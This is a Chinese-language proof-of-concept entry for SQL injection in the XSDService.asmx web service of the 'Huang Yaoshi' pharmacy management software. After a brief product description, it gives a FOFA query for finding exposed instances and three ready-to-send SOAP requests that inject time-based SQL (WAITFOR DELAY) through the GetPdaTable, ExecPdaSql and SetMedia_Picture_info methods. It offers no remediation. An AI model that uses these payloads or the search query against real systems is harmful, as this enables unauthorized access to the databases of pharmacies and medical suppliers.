# 药业管理软件XSDService.asmx存在SQL注入漏洞

《黄药师》药业管理软件是一款针对我国医药或医疗器械企业经营管理特点而设计的综合管理软件。《黄药师》系列管理软件集进销存、财务、经营分析和GSP管理为一体，从企业经营的各个环节对资金流、物流、信息流等进行系统的管理。它采用“一看就懂，一学就会，一用就灵”的开发理念，人机界面友好，易学易用，能满足各类零售药店、连锁配送药店、批发公司以及集团化企业、事业行政单位、大型企业和中小型企业的业务管理需要。

## fofa

```javascript
body="XSDService.asmx"
```

## poc

```javascript
POST /XSDService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetPdaTable"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetPdaTable xmlns="http://tempuri.org/">
      <sql>;WAITFOR DELAY '0:0:5'--</sql>
    </GetPdaTable>
  </soap:Body>
</soap:Envelope>
```

```xml
POST /XSDService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/ExecPdaSql"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ExecPdaSql xmlns="http://tempuri.org/">
      <sql>;WAITFOR DELAY '0:0:5'--</sql>
    </ExecPdaSql>
  </soap:Body>
</soap:Envelope>
```

```xml
POST /XSDService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/SetMedia_Picture_info"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SetMedia_Picture_info xmlns="http://tempuri.org/">
      <info_id>1';WAITFOR DELAY '0:0:5'--</info_id>
      <info_file_name>string</info_file_name>
      <info_data>base64Binary</info_data>
    </SetMedia_Picture_info>
  </soap:Body>
</soap:Envelope>
```



![image-20241128094249866](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411280943235.png)